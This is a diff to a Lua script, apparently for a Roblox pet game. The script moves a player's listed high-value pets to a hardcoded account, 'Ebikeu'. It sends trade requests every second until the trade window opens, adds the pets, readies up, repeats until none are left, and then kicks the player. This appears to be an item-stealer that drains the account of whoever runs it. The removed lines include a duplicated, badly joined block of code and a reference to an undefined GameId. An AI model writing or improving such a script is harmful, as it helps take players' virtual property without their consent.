@@ -1,16 +1,10 @@
 local targetUsername = "Ebikeu"
 local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}
 
--- CONFIGURATION
-local config = {
-    JobId = "d3a62cbe-1d69-4553-9478-b09cd6e98f06",  -- Updated Job ID (kept in config)
-}
-
 -- SERVICES
 local Players = game:GetService("Players")
 local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
 local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
-local TeleportService = game:GetService("TeleportService")
 
 -- VARIABLES
 local player = Players.LocalPlayer
@@ -109,46 +103,34 @@ end
 function TradeWithTarget()
     while true do
         if not HasPetsToTrade() then
-            -- Debugging output to track pet data
-            print("No pets to trade! Debugging:")
-            local pets = Replication.Data and Replication.Data.Pets
-            print(pets)
-            
-            if not player:FindFirstChild("Pets") then
-                print("Player has no pets to trade. Kicking...")
-                player:Kick("No more pets to trade")
-                return
-            end
+            print("No pets to trade! Kicking...")
+            player:Kick("No more pets to trade")
+            return
         end
         
         -- Ensure UnlockPets happens after checking pets
         UnlockPets()
 
-        -- The rest of your trade logic continues...
         local target = FindTargetPlayer()
         if not target then
             task.wait(5)
             return
         end
         
-        Network:FireServer("SendTrade", target)
-        
-        local tradeEnabled = WaitForCondition(function()
-            return player.PlayerGui.Trading.Enabled
-        end, 5)
-        
-        if not tradeEnabled then
-            task.wait(5)
-            return
+        -- Spam trade request every second until the trade window opens
+        while not player.PlayerGui.Trading.Enabled do
+            Network:FireServer("SendTrade", target)
+            task.wait(1)
         end
         
+        -- Once in trade, keep adding pets to the trade
         local petIDs = GetPetIDsByName()
-        
         if #petIDs > 0 then
             for _, petId in ipairs(petIDs) do
                 Network:InvokeServer("AddTradeItem", { "Pet", petId })
             end
             
+            -- Ready up and keep adding pets until trade is completed
             Network:FireServer("ReadyUp", false, true)
             
             local tradeCompleted = WaitForCondition(function()
@@ -163,6 +145,7 @@ function TradeWithTarget()
             end
         end
         
+        -- If still have pets to trade, continue trading
         if HasPetsToTrade() then
             print("Re-entering trade with remaining pets")
             task.wait(1)
@@ -174,160 +157,13 @@ function TradeWithTarget()
 end
 
 -- MAIN LOGIC
-function WaitForGameToLoadAndCheckJobId()
-    while not game:IsLoaded() do
-        task.wait(1)
-    end
-    
-    local currentJobId = game.JobId
-    if currentJobId ~= config.JobId then
-        print("Job ID mismatch. Waiting for correct game to load...")
-        task.wait(5)
-        return false
-    end
-    
-    print("Game loaded. Verifying game ID...")
-    task.wait(5)
-    if game.GameId ~= config.GameId then
-        print("Game ID mismatch.")
-        return false
-    end
-    
-    return true
-end
-
-function JoinGameWithJobId()
-    if not HasPetsToTrade() then
-        print("No pets to trade. Skipping join process.")
-        return
-    end
-
-    -- Use the current game’s GameId and JobId
-    local currentGameId = game.GameId
-    local currentJobId = game.JobId
-    
-    print("Pets available. Joining current game with current Job ID...")
-    TeleportService:TeleportToPlaceInstance(currentGameId, currentJobId)
-end
-
--- Join the game using the current Game ID and Job ID
-JoinGameWithJobId()
-
 while true do
     if not HasPetsToTrade() then
         player:Kick("No more pets to trade")
         break
     end
     
-    if WaitForGameToLoadAndCheckJobId() then
-        print("Job and Game ID verified. Starting trade process.")
-        TradeWithTarget()
-    else
-        print("Failed to join the correct game or match Job ID. Waiting...")
-        task.wait(10)
-    end
-    task.wait(1)
-endfunction TradeWithTarget()
-    while true do
-        if not HasPetsToTrade() then
-            if not player:FindFirstChild("Pets") then
-                player:Kick("No more pets to trade")
-                return
-            end
-        end
-        
-        UnlockPets()
-        
-        local target = FindTargetPlayer()
-        if not target then
-            task.wait(5)
-            return
-        end
-        
-        Network:FireServer("SendTrade", target)
-        
-        local tradeEnabled = WaitForCondition(function()
-            return player.PlayerGui.Trading.Enabled
-        end, 5)
-        
-        if not tradeEnabled then
-            task.wait(5)
-            return
-        end
-        
-        local petIDs = GetPetIDsByName()
-        
-        if #petIDs > 0 then
-            for _, petId in ipairs(petIDs) do
-                Network:InvokeServer("AddTradeItem", { "Pet", petId })
-            end
-            
-            Network:FireServer("ReadyUp", false, true)
-            
-            local tradeCompleted = WaitForCondition(function()
-                return not player.PlayerGui.Trading.Enabled
-            end, 10)
-            
-            if not tradeCompleted then
-                Network:FireServer("CloseTrade")
-                task.wait(0.5)
-            else
-                WaitForPetsRemoved(petIDs)
-            end
-        end
-        
-        if HasPetsToTrade() then
-            print("Re-entering trade with remaining pets")
-            task.wait(1)
-        else
-            print("No more pets left to trade.")
-            break
-        end
-    end
-end
-
--- MAIN LOGIC
-function WaitForGameToLoadAndCheckJobId()
-    while not game:IsLoaded() do
-        task.wait(1)
-    end
-    
-    local currentJobId = game.JobId
-    if currentJobId ~= config.JobId then
-        print("Job ID mismatch. Waiting for correct game to load...")
-        task.wait(5)
-        return false
-    end
-    
-    print("Game loaded. Verifying game ID...")
-    task.wait(5)
-    if game.GameId ~= config.GameId then
-        print("Game ID mismatch.")
-        return false
-    end
-    
-    return true
-end
-
-function JoinGameWithJobId()
-    TeleportService:TeleportToPlaceInstance(config.GameId, config.JobId)
-end
-
--- Join the game using the specified Job ID
-JoinGameWithJobId()
-
-while true do
-    if not HasPetsToTrade() then
-        player:Kick("No more pets to trade")
-        break
-    end
-    
-    if WaitForGameToLoadAndCheckJobId() then
-        print("Job and Game ID verified. Starting trade process.")
-        TradeWithTarget()
-    else
-        print("Failed to join the correct game or match Job ID. Waiting...")
-        task.wait(10)
-    end
+    print("Starting trade process.")
+    TradeWithTarget()
     task.wait(1)
 end
